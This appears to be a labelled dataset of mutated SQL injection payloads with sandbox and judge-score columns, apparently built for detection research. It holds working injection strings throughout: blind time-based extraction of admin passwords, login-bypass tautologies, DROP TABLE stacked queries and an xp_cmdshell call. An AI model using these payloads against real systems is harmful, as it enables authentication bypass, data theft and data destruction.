query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00157,--' OR 1=1 WAITFOR DELAY '0:0:3' --,SELECT * FROM users WHERE username = '--' OR 1=1 WAITFOR DELAY '0:0:3' --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00158,' OR 'a'='b'; SELECT pg_sleep(4); --',SELECT * FROM users WHERE username = '' OR 'a'='b'; SELECT pg_sleep(4); --'' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Or"", ""Column"", ""From"", ""Semicolon"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00159,"' OR (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE username='{username}') > 90 --","SELECT * FROM users WHERE username = '' OR (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE username='{username}') > 90 --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""GT"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Substring"", ""Subquery"", ""Ascii"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00160,"' OR 'x'='y'; BENCHMARK(50000000,SHA1('test')); --","SELECT * FROM users WHERE username = '' OR 'x'='y'; BENCHMARK(50000000,SHA1('test')); --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Or"", ""Column"", ""From"", ""Semicolon"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""SHA"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00161,' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%' AND table_schema LIKE '%public%') --,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%' AND table_schema LIKE '%public%') --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Or"", ""Column"", ""From"", ""And"", ""Identifier"", ""Like"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00162,"--' OR 9999=SLEEP(3)""","SELECT * FROM users WHERE username = '--' OR 9999=SLEEP(3)""' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00164,"/*' OR 1=1*/ (SELECT BENCHMARK(50000000, SHA2('test', 256))) --""","SELECT * FROM users WHERE username = '/*' OR 1=1*/ (SELECT BENCHMARK(50000000, SHA2('test', 256))) --""' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Anonymous"", ""Select"", ""Subquery"", ""Literal"", ""SHA2""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00165,"OR 1=1 --""; (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')","SELECT * FROM users WHERE username = 'OR 1=1 --""; (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00166,"' AND (SELECT ASCII(SUBSTRING(username,2,1)) FROM users WHERE username='{username}') <= 97 --","SELECT * FROM users WHERE username = '' AND (SELECT ASCII(SUBSTRING(username,2,1)) FROM users WHERE username='{username}') <= 97 --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""LTE"", ""Table"", ""Star"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Literal"", ""Select"", ""Substring"", ""Subquery"", ""Ascii"", ""EQ""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00167,"' AND BENCHMARK(50000000, MD5('attack')) --","SELECT * FROM users WHERE username = '' AND BENCHMARK(50000000, MD5('attack')) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Column"", ""From"", ""And"", ""Identifier"", ""MD5"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00169,"--' UNION ALL SELECT NULL,'',NULL,NULL WHERE 1=1 --","SELECT * FROM products WHERE name LIKE '%--' UNION ALL SELECT NULL,'',NULL,NULL WHERE 1=1 --%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00170,"' AND 1=(SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))>110) THEN 1 ELSE 0 END FROM users WHERE username='admin') --","SELECT * FROM products WHERE name LIKE '%' AND 1=(SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))>110) THEN 1 ELSE 0 END FROM users WHERE username='admin') --%'",blind_time,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Paren"", ""GT"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Case"", ""Literal"", ""Select"", ""Substring"", ""If"", ""Subquery"", ""Ascii"", ""EQ""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00171,-1' OR (SELECT 1 FROM (SELECT COUNT(*) AS num FROM information_schema.tables WHERE table_schema = DATABASE())) > 0 --,SELECT * FROM products WHERE name LIKE '%-1' OR (SELECT 1 FROM (SELECT COUNT(*) AS num FROM information_schema.tables WHERE table_schema = DATABASE())) > 0 --%',blind_time,search,1,0,0.0,True,mysql,"[""Alias"", ""Table"", ""Star"", ""GT"", ""Or"", ""Count"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""CurrentSchema"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00172,"' OR @@version COLLATE utf8mb4_bin LIKE '%' AND 0=1 GROUP BY (SELECT BENCHMARK(50000000,SHA2('a',256)))","SELECT * FROM products WHERE name LIKE '%' OR @@version COLLATE utf8mb4_bin LIKE '%' AND 0=1 GROUP BY (SELECT BENCHMARK(50000000,SHA2('a',256)))%'",blind_time,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Or"", ""And"", ""EQ"", ""Column"", ""From"", ""Like"", ""Identifier"", ""Parameter"", ""Where"", ""Literal"", ""Group"", ""Collate"", ""Select"", ""Subquery"", ""Var"", ""SHA2""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00173,' OR EXISTS(SELECT 1 FROM (SELECT * FROM users WHERE username = 'admin' AND password LIKE '%'))--,SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM (SELECT * FROM users WHERE username = 'admin' AND password LIKE '%'))--%',blind_time,search,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Like"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00174,' OR (SELECT 1 FROM (SELECT * FROM system.users WHERE name = 'sa' AND loginame LIKE '%'))--,SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (SELECT * FROM system.users WHERE name = 'sa' AND loginame LIKE '%'))--%',blind_time,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Like"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00175,"' OR (SELECT 1 FROM (SELECT CASE WHEN ASCII(SUBSTRING(name,1,1))>%100 THEN 1 ELSE 0 END FROM products LIMIT 1))","SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (SELECT CASE WHEN ASCII(SUBSTRING(name,1,1))>%100 THEN 1 ELSE 0 END FROM products LIMIT 1))%'",blind_time,search,1,0,0.0,True,teradata,"[""Table"", ""Star"", ""GT"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Case"", ""Limit"", ""Literal"", ""Select"", ""Substring"", ""If"", ""Subquery"", ""Ascii"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00176,"--' UNION ALL SELECT NULL,(CASE WHEN (SELECT 1*1=1) THEN SLEEP(5) ELSE '' END),NULL,NULL WHERE 1=1","SELECT * FROM products WHERE name LIKE '%--' UNION ALL SELECT NULL,(CASE WHEN (SELECT 1*1=1) THEN SLEEP(5) ELSE '' END),NULL,NULL WHERE 1=1%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00179,' OR EXISTS(SELECT 1 FROM (SELECT * FROM products WHERE id=%RAND%)),SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM (SELECT * FROM products WHERE id=%RAND%))%',blind_time,search,1,0,0.0,True,teradata,"[""Table"", ""Exists"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00180,"' AND IF(ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=114,SLEEP(5),'') --","SELECT * FROM users WHERE id = ' AND IF(ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=114,SLEEP(5),'') --",blind_time,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Literal"", ""Select"", ""Substring"", ""If"", ""Subquery"", ""Ascii"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00181,"' OR 1=1 LIMIT 1,1 /*! WAITFOR DELAY '0:0:10' */ --","SELECT * FROM users WHERE id = ' OR 1=1 LIMIT 1,1 /*! WAITFOR DELAY '0:0:10' */ --",blind_time,user_lookup,1,0,0.0,True,default,"[""Offset"", ""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Limit"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00182,"' AND EXISTS(SELECT * FROM (SELECT BENCHMARK(5000000,CONCAT(username,password))) AS T) --","SELECT * FROM users WHERE id = ' AND EXISTS(SELECT * FROM (SELECT BENCHMARK(5000000,CONCAT(username,password))) AS T) --",blind_time,user_lookup,1,0,0.0,True,default,"[""Concat"", ""Table"", ""Exists"", ""Anonymous"", ""Star"", ""TableAlias"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00183,""" AND (SELECT ASCII(MID((SELECT CONCAT(email,'|',password) FROM users WHERE id=1),1,1))=98) = '"" --","SELECT * FROM users WHERE id = "" AND (SELECT ASCII(MID((SELECT CONCAT(email,'|',password) FROM users WHERE id=1),1,1))=98) = '"" --",blind_time,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""EQ""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00184,' AND LENGTH((SELECT database())) > 10 /*! SLEEP(2) */ --,SELECT * FROM users WHERE id = ' AND LENGTH((SELECT database())) > 10 /*! SLEEP(2) */ --,blind_time,user_lookup,1,0,0.0,True,mysql,"[""Table"", ""Star"", ""GT"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Literal"", ""Select"", ""Subquery"", ""Length"", ""CurrentSchema"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00185,"' AND (SELECT (CASE WHEN ASCII(SUBSTRING((SELECT username FROM users WHERE id=1 FOR UPDATE),1,1))=114 THEN SLEEP(5) ELSE NULL END)) --","SELECT * FROM users WHERE id = ' AND (SELECT (CASE WHEN ASCII(SUBSTRING((SELECT username FROM users WHERE id=1 FOR UPDATE),1,1))=114 THEN SLEEP(5) ELSE NULL END)) --",blind_time,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Paren"", ""And"", ""Substring"", ""Case"", ""EQ"", ""Column"", ""From"", ""Identifier"", ""Lock"", ""Where"", ""Literal"", ""Ascii"", ""Null"", ""Select"", ""If"", ""Subquery""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00186,"' OR EXISTS(SELECT * FROM (SELECT BENCHMARK(5000000,CONCAT(username,password)) FROM users WHERE id=1)) --","SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM (SELECT BENCHMARK(5000000,CONCAT(username,password)) FROM users WHERE id=1)) --",blind_time,user_lookup,1,0,0.0,True,default,"[""Concat"", ""Table"", ""Exists"", ""Anonymous"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00187,--' AND LENGTH((SELECT password FROM users WHERE id=1)) > 10 AND '--',SELECT * FROM users WHERE id = --' AND LENGTH((SELECT password FROM users WHERE id=1)) > 10 AND '--',blind_time,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00190,' OR 1=1 --,SELECT * FROM orders WHERE status = '' OR 1=1 --' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00191,"CASE WHEN 1=1 THEN BENCHMARK(1000000, ENCODE('secret', 'md5')) ELSE NULL END --","SELECT * FROM orders WHERE status = 'CASE WHEN 1=1 THEN BENCHMARK(1000000, ENCODE('secret', 'md5')) ELSE NULL END --' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,default,"[""Null"", ""Anonymous"", ""Case"", ""If"", ""Literal"", ""Encode"", ""EQ""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00192,'; DECLARE @counter INT SET @counter = 0 WHILE @counter < 10 BEGIN PRINT 'Injection' SET @counter = @counter + 1 END --,SELECT * FROM orders WHERE status = ''; DECLARE @counter INT SET @counter = 0 WHILE @counter < 10 BEGIN PRINT 'Injection' SET @counter = @counter + 1 END --' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,postgres,"[""Table"", ""Star"", ""Column"", ""From"", ""Command"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00193,' AND (SELECT 1 FROM (SELECT SLEEP(5)) AS x),SELECT * FROM orders WHERE status = '' AND (SELECT 1 FROM (SELECT SLEEP(5)) AS x)' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""TableAlias"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00194,"' AND IF((SELECT 1), BENCHMARK(1000000, SHA1('secret')), NULL)","SELECT * FROM orders WHERE status = '' AND IF((SELECT 1), BENCHMARK(1000000, SHA1('secret')), NULL)' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,default,"[""Null"", ""Table"", ""Star"", ""Anonymous"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""If"", ""Subquery"", ""Literal"", ""SHA"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00196,"' OR EXISTS(SELECT 1 FROM users WHERE username = CHAR(115, 101, 99, 116, 114, 101, 99)) --","SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1 FROM users WHERE username = CHAR(115, 101, 99, 116, 114, 101, 99)) --' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""Chr"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00198,--' and (select 1 from (select sleep(5)) as x) --,SELECT * FROM orders WHERE status = '--' and (select 1 from (select sleep(5)) as x) --' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00199,"' OR (SELECT 1 FROM users WHERE username LIKE CHAR(83, 101, 99, 116, 114, 101, 99))--","SELECT * FROM orders WHERE status = '' OR (SELECT 1 FROM users WHERE username LIKE CHAR(83, 101, 99, 116, 114, 101, 99))--' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""Like"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""Chr"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00200,;WITH cte AS (SELECT 1 AS num UNION ALL SELECT 1 FROM cte WHERE num < 6) SELECT * FROM orders WHERE status = '--' AND (select num from cte);,SELECT * FROM orders WHERE status = ';WITH cte AS (SELECT 1 AS num UNION ALL SELECT 1 FROM cte WHERE num < 6) SELECT * FROM orders WHERE status = '--' AND (select num from cte);' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,default,"[""Alias"", ""Table"", ""Star"", ""TableAlias"", ""LT"", ""Union"", ""Where"", ""With"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""CTE"", ""Subquery"", ""Literal"", ""EQ""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00201,"/*' AND (SELECT 1 FROM (SELECT benchmark(1000000, md5('test'))) AS y) --*/","SELECT * FROM orders WHERE status = '/*' AND (SELECT 1 FROM (SELECT benchmark(1000000, md5('test'))) AS y) --*/' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00205,' OR (SELECT 1 FROM information_schema.tables WHERE table_name='users')--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM information_schema.tables WHERE table_name='users')--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00206,"--' UNION SELECT NULL,NULL,NULL,(CASE WHEN SLEEP(5)=0 THEN 'X' ELSE 'Y' END)","INSERT INTO comments (user_id, body) VALUES (1, '--' UNION SELECT NULL,NULL,NULL,(CASE WHEN SLEEP(5)=0 THEN 'X' ELSE 'Y' END)')",blind_time,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00207,' OR SLEEP(FLOOR(RAND()*10 + 5))--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR SLEEP(FLOOR(RAND()*10 + 5))--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Rand"", ""Or"", ""Add"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Mul"", ""Floor"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00208,"' ORDER BY (BENCHMARK(500000,ENCODE('sleepy','password'))) ASC--","INSERT INTO comments (user_id, body) VALUES (1, '' ORDER BY (BENCHMARK(500000,ENCODE('sleepy','password'))) ASC--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Anonymous"", ""Order"", ""Paren"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Ordered"", ""Where"", ""Literal"", ""Encode"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00209,"' OR SUBSTRING((SELECT password FROM users WHERE user_id=1),1,1)='a' AND BENCHMARK(50000,'a'=NULL) OR'","INSERT INTO comments (user_id, body) VALUES (1, '' OR SUBSTRING((SELECT password FROM users WHERE user_id=1),1,1)='a' AND BENCHMARK(50000,'a'=NULL) OR'')",blind_time,comment_insert,1,0,0.0,True,default,"[""Null"", ""Table"", ""Star"", ""Anonymous"", ""Or"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Substring"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00210,"--' UNION ALL SELECT NULL,NULL,(CASE WHEN ASCII(SUBSTRING(password,1,1))=97 THEN SLEEP(5) ELSE 0 END)--","INSERT INTO comments (user_id, body) VALUES (1, '--' UNION ALL SELECT NULL,NULL,(CASE WHEN ASCII(SUBSTRING(password,1,1))=97 THEN SLEEP(5) ELSE 0 END)--')",blind_time,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00211,"' OR EXISTS(SELECT * FROM information_schema.processlist WHERE command LIKE '%Sleep%' AND TIME_TO_SEC(TIMEDIFF(NOW(),start_time))>5) OR'","INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT * FROM information_schema.processlist WHERE command LIKE '%Sleep%' AND TIME_TO_SEC(TIMEDIFF(NOW(),start_time))>5) OR'')",blind_time,comment_insert,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Literal"", ""Mod""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00212,'; EXEC master..xp_cmdshell 'echo x > C:\test.txt'; --,SELECT * FROM users WHERE username = ''; EXEC master..xp_cmdshell 'echo x > C:\test.txt'; --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,postgres,"[""Table"", ""Star"", ""Column"", ""From"", ""Semicolon"", ""Command"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00213,";--
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1; --","SELECT * FROM users WHERE username = ';--
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1; --' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Semicolon"", ""Where"", ""Literal"", ""EQ""]",True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00215,; SELECT * FROM users WHERE username = 'admin' AND password = '' OR CHAR(97)+CHAR(98)+CHAR(99) IN ('abc') --,SELECT * FROM users WHERE username = '; SELECT * FROM users WHERE username = 'admin' AND password = '' OR CHAR(97)+CHAR(98)+CHAR(99) IN ('abc') --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Add"", ""Column"", ""From"", ""And"", ""Identifier"", ""In"", ""Select"", ""Where"", ""Literal"", ""Chr"", ""EQ""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00216,;SELECT * FROM users WHERE username = ''; DROP TABLE users; --,SELECT * FROM users WHERE username = ';SELECT * FROM users WHERE username = ''; DROP TABLE users; --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Semicolon"", ""Identifier"", ""Drop"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00219,;SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1; --,SELECT * FROM users WHERE username = ';SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1; --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Semicolon"", ""Where"", ""Literal"", ""EQ""]",True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00220,--%'; DROP TABLE users;,SELECT * FROM products WHERE name LIKE '%--%'; DROP TABLE users;%',stacked_queries,search,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
